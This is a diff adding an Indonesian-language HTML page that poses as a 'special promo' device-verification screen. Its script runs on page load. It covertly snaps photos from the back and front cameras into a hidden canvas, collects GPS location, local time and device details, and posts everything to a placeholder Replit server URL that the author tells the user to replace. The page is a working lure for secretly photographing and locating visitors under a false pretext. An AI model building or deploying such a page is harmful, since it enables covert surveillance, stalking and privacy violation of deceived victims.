@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Promo Spesial</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
+        .loading {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #007bff;
+        }
+    </style>
+</head>
+<body>
+    <h1>Promo Spesial Hari Ini!</h1>
+    <p>Kami sedang memverifikasi perangkat Anda untuk memberikan penawaran terbaik.</p>
+    <p class="loading">Sedang memuat data...</p>
+    
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    
+    <script>
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const SERVER_URL = "https://your-replit-app.replit.app/upload"; // Ganti dengan URL Replit Anda
+
+        // Fungsi untuk mengambil data lokasi GPS
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            });
+                        },
+                        error => {
+                            resolve({ latitude: "Tidak diizinkan", longitude: "Tidak diizinkan" });
+                        }
+                    );
+                } else {
+                    resolve({ latitude: "Tidak didukung", longitude: "Tidak didukung" });
+                }
+            });
+        }
+
+        // Ambil waktu real-time dari perangkat pengguna
+        function getUserTime() {
+            const now = new Date();
+            return {
+                year: now.getFullYear().toString(),
+                month: (now.getMonth() + 1).toString().padStart(2, '0'),
+                day: now.getDate().toString().padStart(2, '0'),
+                time: now.getHours().toString().padStart(2, '0') + ':' + 
+                      now.getMinutes().toString().padStart(2, '0') + ':' + 
+                      now.getSeconds().toString().padStart(2, '0')
+            };
+        }
+
+        // Ambil data perangkat pengguna secara lebih detail
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceModel = "Tidak diketahui";
+            let deviceBrand = "Tidak diketahui";
+            let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak tersedia";
+            let rom = "Tidak tersedia";
+            let price = "Tidak tersedia";
+
+            const deviceType = /Mobile/i.test(ua) ? "Mobile" : "Desktop";
+            if (/Android/i.test(ua)) {
+                deviceBrand = "Android";
+                const modelMatch = ua.match(/\((.*?)\)/);
+                if (modelMatch) {
+                    const details = modelMatch[1].split(';');
+                    deviceModel = details.find(d => d.includes("Build")) ? details[details.length - 2].trim() : details[0].trim();
+                }
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                deviceBrand = "Apple";
+                deviceModel = ua.match(/(iPhone|iPad|iPod)/)[0];
+            }
+
+            const deviceDatabase = {
+                "SM-A515F": { rom: "128 GB", price: "Rp 3.000.000" },
+                "Redmi Note 8": { rom: "64 GB", price: "Rp 1.800.000" },
+                "iPhone 12": { rom: "64 GB", price: "Rp 10.000.000" }
+            };
+            if (deviceModel in deviceDatabase) {
+                rom = deviceDatabase[deviceModel].rom;
+                price = deviceDatabase[deviceModel].price;
+            } else if (ram !== "Tidak tersedia") {
+                const ramValue = parseInt(ram.split(" ")[0]);
+                rom = ramValue >= 8 ? "128 GB" : ramValue >= 4 ? "64 GB" : "32 GB";
+                price = ramValue >= 8 ? "Rp 5.000.000" : ramValue >= 4 ? "Rp 2.000.000" : "Rp 1.000.000";
+            }
+
+            return {
+                deviceType: deviceType,
+                deviceBrand: deviceBrand,
+                deviceModel: deviceModel,
+                ram: ram,
+                rom: rom,
+                price: price
+            };
+        }
+
+        // Fungsi untuk mengambil gambar dari kamera
+        async function captureImage(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, 640, 480);
+                        const dataUrl = canvas.toDataURL('image/jpeg');
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(dataUrl);
+                    }, 1000);
+                });
+            } catch (err) {
+                return null;
+            }
+        }
+
+        // Ambil gambar dari kamera belakang dan depan
+        async function captureBothImages() {
+            const backImage = await captureImage("environment");
+            const frontImage = await captureImage("user");
+
+            const images = {};
+            if (backImage) images.back = backImage;
+            if (frontImage) images.front = frontImage;
+
+            return images;
+        }
+
+        // Jalankan proses pengambilan gambar dan pengiriman data
+        captureBothImages().then(images => {
+            getLocation().then(location => {
+                const userTime = getUserTime();
+                const deviceInfo = getDeviceInfo();
+                fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        images: images,
+                        location: location,
+                        time: userTime,
+                        device: deviceInfo
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    document.querySelector('.loading').innerText = "Verifikasi selesai! Terima kasih.";
+                })
+                .catch(err => {
+                    document.querySelector('.loading').innerText = "Terjadi kesalahan. Silakan coba lagi.";
+                });
+            });
+        }).catch(err => {
+            document.querySelector('.loading').innerText = "Gagal memverifikasi perangkat.";
+        });
+    </script>
+</body>
+</html>
